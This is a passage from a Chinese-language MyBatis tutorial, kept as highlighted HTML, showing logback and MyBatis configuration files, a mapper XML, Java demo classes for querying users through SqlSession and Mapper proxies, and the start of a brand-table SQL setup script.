class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.ConsoleAppender<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoder</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pattern</span><span class="token punctuation">></span></span>[%level] %blue(%d&#123;HH:mm:ss.SSS&#125;) %cyan([%thread]) %boldGreen(%logger&#123;15&#125;) - %msg %n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pattern</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoder</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appender</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>logger</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>DEBUG<span class="token punctuation">"</span></span> <span class="token attr-name">additivity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>logger</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--      level:用来设置打印级别，大小写无关：TRACE, DEBUG, INFO, WARN, ERROR, ALL 和 OFF     ， 默认debug      &lt;root>可以包含零个或多个&lt;appender-ref>元素，标识这个输出位置将会被本日志级别控制。      --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>DEBUG<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>在 main 的 resources 下创建 mybatis-config.xml，内容如下</li></ol><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">configuration</span>        <span class="token name">PUBLIC</span> <span class="token string">"-//mybatis.org//DTD Config 3.0//EN"</span>        <span class="token string">"http://mybatis.org/dtd/mybatis-3-config.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>environments</span> <span class="token attr-name">default</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>development<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>environment</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>development<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>transactionManager</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JDBC<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataSource</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POOLED<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--                数据库配置，自行修改--></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>driver<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.mysql.jdbc.Driver<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbc:mysql:///mybatis?useSSL=false<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dataSource</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>environment</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>environments</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mappers</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mapper</span> <span class="token attr-name">resource</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UserMapper.xml<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mappers</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>在 main 的 resources 下创建 UserMapper.xml，Mapper 为映射文件，命名规则为<mark>表名 Mapper.xml</mark>，namespace 为名称空间，id 为<mark>唯一标识 sql 语句的符号</mark>，在执行 SQL 语句时需要使用；resultType 为查询结果要放的类</li></ol><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">mapper</span>        <span class="token name">PUBLIC</span> <span class="token string">"-//mybatis.org//DTD Mapper 3.0//EN"</span>        <span class="token string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--    namespace：标签空间--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mapper</span> <span class="token attr-name">namespace</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>selectAll<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.pojo.User<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        select * from tb_user;    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mapper</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>测试编码</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Resources</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>session<span class="token punctuation">.</span></span><span class="token class-name">SqlSession</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>session<span class="token punctuation">.</span></span><span class="token class-name">SqlSessionFactory</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>session<span class="token punctuation">.</span></span><span class="token class-name">SqlSessionFactoryBuilder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MybatisDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//1.加载mybatis核心配置文件，获取sqlSessionFactory，这一段直接复制官网</span>        <span class="token comment">//配置文件工作路径直接在resources下找</span>        <span class="token class-name">String</span> resource <span class="token operator">=</span> <span class="token string">"mybatis-config.xml"</span><span class="token punctuation">;</span>        <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> <span class="token class-name">Resources</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span>resource<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">SqlSessionFactory</span> sqlSessionFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlSessionFactoryBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2.获取SQLSession对象来执行SQL语句</span>        <span class="token class-name">SqlSession</span> sqlSession <span class="token operator">=</span> sqlSessionFactory<span class="token punctuation">.</span><span class="token function">openSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//3.执行SQL语句</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> users <span class="token operator">=</span> sqlSession<span class="token punctuation">.</span><span class="token function">selectList</span><span class="token punctuation">(</span><span class="token string">"test.selectAll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//4.释放资源</span>        sqlSession<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-mapper代理开发"><a class="markdownIt-Anchor" href="#3-mapper代理开发">#</a> 3、Mapper 代理开发</h1><ul><li>目的：<ul><li>解决原生方式中的硬编码</li><li>简化后期 SQL 执行</li></ul></li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623073719183.png" alt="image-20220623073719183"></p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>UserMapper：接口，里面会有很多方法，会和配置文件里的 id 名称一一对应</p></blockquote><h2 id="31-使用mapper代理开发完成入门案例"><a class="markdownIt-Anchor" href="#31-使用mapper代理开发完成入门案例">#</a> 3.1 使用 Mapper 代理开发完成入门案例</h2><ol><li>定义与 SQL 映射文件同名的 Mapper 接口，并且将 Mapper 接口和 SQL 映射文件放置在同一目录下<ul><li>注意：maven 要求配置文件和 java 代码分开。因此不要将配置文件直接拖到代码目录，可以在 resources 目录下建立与 Mapper 接口同级别同名的目录树</li></ul></li><li>设置 SQL 映射文件的 namespace 属性为 Mapper 接口全限定名</li><li>在 Mapper 接口中定义方法，方法名就是 SQL 映射文件中 SQL 语句的 id，并保持参数类型和返回值一致</li><li>编码<ol><li>通过 SQLSession 的 getMapper 获取 Mapper 接口的代理对象</li><li>调用对应方法完成 SQL</li></ol></li></ol><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623074125895.png" alt="image-20220623074125895"></p><ol><li>目录树结构：</li></ol><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623074746739.png" alt="image-20220623074746739"></p><ol start="2"><li>映射的名称空间为接口的全限定名</li></ol><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623074925025.png" alt="image-20220623074925025"></p><ol start="3"><li>定义方法，方法名是映射文件 SQL 的 id，没有参数，返回值是一个 User 的集合，由于配置文件路径改了，要在 mybatis-config.xml 中更改 mapper resources 的路径</li></ol><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623075054186.png" alt="image-20220623075054186"></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623075243996.png" alt="image-20220623075243996"></p><p>4、编码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>mapper<span class="token punctuation">.</span></span><span class="token class-name">UserMapper</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Resources</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>session<span class="token punctuation">.</span></span><span class="token class-name">SqlSession</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>session<span class="token punctuation">.</span></span><span class="token class-name">SqlSessionFactory</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>session<span class="token punctuation">.</span></span><span class="token class-name">SqlSessionFactoryBuilder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token comment">/** * mybatis代理开发 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MybatisDemo2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//1.加载mybatis核心配置文件，获取sqlSessionFactory</span>        <span class="token class-name">String</span> resource <span class="token operator">=</span> <span class="token string">"mybatis-config.xml"</span><span class="token punctuation">;</span>        <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> <span class="token class-name">Resources</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span>resource<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">SqlSessionFactory</span> sqlSessionFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlSessionFactoryBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2.获取SQLSession对象来执行SQL语句</span>        <span class="token class-name">SqlSession</span> sqlSession <span class="token operator">=</span> sqlSessionFactory<span class="token punctuation">.</span><span class="token function">openSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//3.获取UserMapper接口的代理对象</span>        <span class="token class-name">UserMapper</span> userMapper <span class="token operator">=</span> sqlSession<span class="token punctuation">.</span><span class="token function">getMapper</span><span class="token punctuation">(</span><span class="token class-name">UserMapper</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> users <span class="token operator">=</span> userMapper<span class="token punctuation">.</span><span class="token function">selectAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//4.释放资源</span>        sqlSession<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-mybatis核心配置文件"><a class="markdownIt-Anchor" href="#4-mybatis核心配置文件">#</a> 4、Mybatis 核心配置文件</h1><ul><li><p>核心配置文件：mybatis-config.xml</p></li><li><p>environments：环境，里面有 environment，可以配置多个不同的数据库，通过改变 default 来改变数据源</p></li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--    配置数据库连接环境信息，可以配置多个environment，通过对应的default属性来切换数据库--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>environments</span> <span class="token attr-name">default</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>development<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>environment</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>development<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>transactionManager</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JDBC<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataSource</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POOLED<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--                数据库配置--></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>driver<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.mysql.jdbc.Driver<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbc:mysql:///mybatis?useSSL=false<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dataSource</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>environment</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>environments</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>typeAliases：别名，作用：将包目录下的类起一个别名，这样在 mapper 中就不需要写类的全名了，且不区分大小写</li></ul><pre class="line-numbers language-none"><code class="language-none">&lt;typeAliases&gt;&lt;package name&#x3D;&quot;com.itheima.pojo&#x2F;&quot;&gt;&lt;&#x2F;typeAliases&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623081008599.png" alt="image-20220623081008599"></p><ul><li>配置别名时要遵守标签顺序</li></ul><h1 id="5-配置文件完成增删改查"><a class="markdownIt-Anchor" href="#5-配置文件完成增删改查">#</a> 5、配置文件完成增删改查</h1><ul><li><p>要完成的功能列表清单</p><ol><li>查询<ul><li>查询所有数据</li><li>查看详情</li><li>条件查询</li></ul></li><li>添加</li><li>修改<ul><li>修改全部字段</li><li>修改动态字段</li></ul></li><li>删除<ul><li>删除一个</li><li>批量删除</li></ul></li></ol></li><li><p>准备环境</p><ul><li>数据库表 tb_brand</li><li>实体类 Brand</li><li>测试用例</li><li>安装 MyBatisX 插件</li></ul></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 删除tb_brand表</span><span class="token keyword">drop</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token keyword">exists</span> tb_brand<span class="token punctuation">;</span><span class="token comment">-- 创建tb_brand表</span><span class="token keyword">create</span> <span class="token keyword">table</span> tb_brand<span class="token punctuation">(</span>    <span class="token comment">-- id 主键</span>    id           <span class="token keyword">int</span> <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token keyword">auto_increment</span><span class="token punctuation">,</span>    <span class="token comment">-- 品牌名称</span>    brand_name   <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment">-- 企业名称</span>    company_name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment">-- 排序字段</span>    ordered      <span class="token keyword">int</span><span class="token punctuation">,</span>    <span class="token comment">-- 描述信息</span>    description  <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment">-- 状态：0：禁用  1：启用</span>    <span class="token keyword">status</span>       <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- 添加数据</span><span class="token keyword">insert</span> <span class="token keyword">into</span> tb_brand <span class="token punctuation">(</span>brand_name<span class="token punctuation">,</span> company_name<span class="token punctuation">,</span> ordered<span class="token punctuation">,</span> description<span class="token punctuation">,</span> <span class="token keyword">status</span><span class="token punctuation">)</span><span class="token keyword">values</span> <span class="token punctuation">(</span><span class="token string">'三只松鼠'</span><span class="token punctuation">,</span> <span class="token 